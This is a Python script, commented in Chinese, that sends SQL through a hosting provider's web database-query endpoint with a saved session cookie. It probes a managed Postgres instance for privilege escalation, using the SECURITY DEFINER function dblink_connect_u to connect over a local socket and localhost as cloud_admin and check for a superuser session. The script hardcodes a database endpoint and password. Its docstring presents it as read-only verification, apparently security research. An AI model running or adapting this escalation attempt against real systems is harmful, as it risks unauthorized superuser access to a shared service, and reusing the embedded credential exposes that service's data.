# -*- coding: utf-8 -*-
"""!! 高价值:dblink_connect_u(owner=cloud_admin SECURITY DEFINER)验证 !!
1. pg_hba_file_rules 可见性(local socket 认证方式)
2. dblink_connect_u 带密码回环(验证 definer 通道)
3. dblink_connect_u local socket 以 cloud_admin 连接(若 trust -> 超级用户!)
4. dblink_connect_u localhost TCP 以 cloud_admin 连接
安全:全部只读;若获得超级用户会话仅 select session_user/rolsuper 证明,零写操作
"""
import http.client, ssl, gzip, brotli, json, sys, itertools
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

EP_A = 'ep-autumn-cherry-ay51mbqz.c-5.us-east-2.db.netlify.com'
PWD_A = 'npg_MtTpnyk2LE4j'
ctx = ssl.create_default_context()
_seq = itertools.count(1)


def q(sql, trunc=1500, timeout=60):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    body = {'siteId': SITE_A, 'action': 'query', 'sql': sql}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    try:
        r = conn.getresponse()
        raw = r.read()
        enc = r.getheader('Content-Encoding')
        if enc == 'br':
            raw = brotli.decompress(raw)
        elif enc == 'gzip':
            raw = gzip.decompress(raw)
        st, out = r.status, raw[:trunc].decode('utf-8', 'ignore')
    except Exception as e:
        st, out = -1, 'EXC %r' % e
    finally:
        conn.close()
    return st, out


def show(label, sql, trunc=900):
    st, out = q(sql, trunc=trunc)
    print('%-52s [%d] %s' % (label, st, out.replace('\n', ' | ')[:trunc]))
    return st, out


n = next(_seq)
print('== 0. pg_hba 可见性 ==')
show('pg_hba_file_rules 查询', 'select count(*) from pg_hba_file_rules', 400)

print()
print('== 1. dblink_connect_u 带密码回环(验证 definer 通道)==')
show('connect_u 回环(owner 密码)',
     "select dblink_connect_u('cxu1', 'host=%s dbname=netlifydb user=netlifydb_owner password=%s connect_timeout=8')" % (EP_A, PWD_A), 500)
show('cxu1 身份(远端 current_user)',
     "select * from dblink('cxu1', 'select current_user::text, inet_server_addr()::text') as t(u text, ip text)", 500)
show('cxu1 断开', "select dblink_disconnect('cxu1')", 300)

print()
print('== 2. local socket 尝试(host=/var/run/postgresql)==')
for user in ['cloud_admin', 'netlifydb_owner']:
    show('socket user=%s' % user,
         "select dblink_connect_u('cxs_%s', 'host=/var/run/postgresql dbname=netlifydb user=%s connect_timeout=3')" % (user, user), 500)
    show('socket %s 身份' % user,
         "select * from dblink('cxs_%s', 'select current_user::text, session_user::text, rolsuper::text from pg_roles where rolname=current_user') as t(u text, s text, sup text)" % user, 500)
    show('socket %s 断开' % user, "select dblink_disconnect('cxs_%s')" % user, 300)

print()
print('== 3. localhost TCP 尝试 ==')
for user in ['cloud_admin', 'netlifydb_owner']:
    show('localhost user=%s' % user,
         "select dblink_connect_u('cxl_%s', 'host=127.0.0.1 dbname=netlifydb user=%s connect_timeout=3')" % (user, user), 500)
    show('localhost %s 身份' % user,
         "select * from dblink('cxl_%s', 'select current_user::text, rolsuper::text from pg_roles where rolname=current_user') as t(u text, sup text)" % user, 500)
    show('localhost %s 断开' % user, "select dblink_disconnect('cxl_%s')" % user, 300)
